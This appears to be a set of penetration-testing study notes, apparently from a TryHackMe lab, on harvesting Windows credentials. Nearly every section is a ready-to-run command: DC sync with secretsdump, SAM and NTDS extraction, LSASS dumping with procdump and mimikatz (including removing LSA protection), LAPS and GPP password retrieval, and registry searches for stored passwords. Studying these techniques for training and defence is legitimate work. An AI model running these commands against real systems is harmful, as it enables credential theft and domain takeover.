# Credentials Harvesting

## Remote Windows Credentials

### DC Sync

When an account that has the following AD permissions, Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes in Filtered Set or administrator replicates the entire domain. **Can use MimiKatz**.

`python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.120.81` to perform a DC sync

* the `-just-dc` argument is for extracting the NTDS data.  (`-just-dc-ntlm` to dump only NTLM hashes)
* the `thm.red/AD_Admin_User` is the authenticated domain user in the form of (domain/user).

## Local Windows Credentials

### Dumping the SAM

#### Metasploit HashDump

Gets a copy of the content of the SAM database by using in-memory code inejction the LSSAS.exe process.

`meterpreter > hashdump`

#### Volume Shadow Copy Service

A native service that helps perform volume backup while application read/write on volumes. (Note: needs administrator privileges).

1. `C:\Users\Administrator>wmic shadowcopy call create Volume='C:'` to create a copy of shaodw of `C:` Drive
2. `vssadmin list shadows` to confirm that we have a shadow copy of `C:`&#x20;
3. The SAM database is encrypted with RC4 or AES, so we need the decryption key which is stored in `c:\Windows\System32\Config\system`&#x20;
   1. `copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam`&#x20;
   2. `copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system`&#x20;

#### Registry Hives

Windows Registry stored a copy of some of the SAM database contents to be used by window services.

1. Save both decryption files for the decryption key
   1. `reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg`&#x20;
   2. `reg save HKLM\system C:\users\Administrator\Desktop\system-reg`&#x20;
2. `python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL` to use Impact `secretsdump.py` to decrypt. Specified `LOCAL` to specify that this is the LOCAL SAM

### Dumping the LSASS

#### GUI

To dump any running Windows process using the GUI, open Task Manager and from the Details tab right-click on a process to "Create dump file".

#### Sysinternals Suite

Using ProcDump we can dump the lsass given that the Sysinternals Suite is installed.

`procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump`

{% hint style="info" %}
Dumping the LSASS process is a known technique easily caught by AVs. AV bypasses need to implemented in the real world to perform such an action.
{% endhint %}

#### MimiKatz

`mimikatz.exe` to run the mimikatz binary **(Note: must be run as `SYSTEM` or local administrator).**

`privilege::debug` to enable the `SeDebugPrivilege` privilege and check the current permissions for memory access.

`sekurlsa::logonpasswords` to dump all cached passwords and hashes from the `lsass.exe`

**Protected LSASS**

Since 2012, the LSASS has been protected from being accessed to extract credentials from memory.

`!+` in mimikatz to run the `mimidrv.sys` driver that runs at the kernel to disaable the LSA protection

`!processprotect /process:lsass.exe /remove` to disable the protection.

### Windows Credential Manager

Accessible via a GUI in the Control Panel. But also via the command prompt.

`vaultcmd /list` to enumerate which windows vaults exist

`VaultCmd /listproperties:"VAULT"` to view if there are any stored credentials

`VaultCmd /listcreds:"Web Credentials"` to view more information about it

#### Dumping the WCM

Must use PowerShell Scripts such as the [`Get-WebCredentials.ps1`](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)&#x20;

#### RunAs

Allows users to run Windows applications under different users' permissions.&#x20;

`cmdkey /list`  as another way to enumerate the stored credentials, can use `/list:computername` as well

`runas /savecred /user:THM.red\thm-local cmd.exe` to run the cmd.exe as thm-local user

### Domain Controller

We are trying to dump the NTDS located in `C:\Windows\NTDS` . This file is encrypted so we need to dump the system Boot Key to attempt to decrypt LSA Isolated credentials, stored in the `SECURITY` filesystem.

#### Ntdsutil

Windows utility to used manage and maintain Active Directory configurations. Can be used to restore deleted objects in AD, perform maintencance in the AD, configure AD snapshot management, and set Directory Services Restore Mode (DSRM) administrator passwords.

`powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"` to locally dump the the NTDS by **having administrator access to the domain controller.**

`python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local` to extract the hashes after having transfered to the attacking machine

### Local Administrator Password Solution (LAPS)

#### Enumeration

1. `dir "C:\Program Files\LAPS\CSE"` to check if LAPS is installed by checking the `admpwd.dll` path
2. `Get-Command AdmPwd` to check the available commands
3. `Find-AdmPwdExtendedRights -Identity THMorg` to check which AD OU has "All extended rights" attribute (Note: can use `-Identity *` to list all available OUs)
4. `net groups "THMGroupReader"` to check group and its members (Note: check the output of the command before to enumerate the right OU)

#### Getting the Password

1. Compromise or impersonate the user that is part of the OU with the proper permissions
2. `Get-AdmPwdPassword -ComputerName creds-harvestin` to get the LAPS password on the arget machine with LAPS enabled

#### (Legacy) GPP

The GPP relevant XML files contains passwords encrypted using AES-256 encryption, the private key was somehow leaked so you can crack the SYSVOL with [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1).

## Quick Wins

#### Powershell History

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`&#x20;

#### Saved Windows Credentials

`cmdkey /list` lists all credentials stored in the Windows Credential Manager (Note: won't allow you to view them directly)

`runas /savecred /user:admin cmd.exe` run a cmd.exe as the user stored in the Credential Manager

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keyword` to view if auto-log on is stored in the Windows registry

`reg query HKLM /f "password" /t REG_SZ /s` to search the registry for anything related to the password

#### Internet Information Services (IIS) Configuration

Is responsible for the default web server on Windows installs. Will sometimes store password for databases or configurated authentications.

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

#### Retrieve Credentials from software

PuTTY (SSH client on windows): stores connection parameters such as IPs and SSH passwords. Only accessible with Proxy  `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
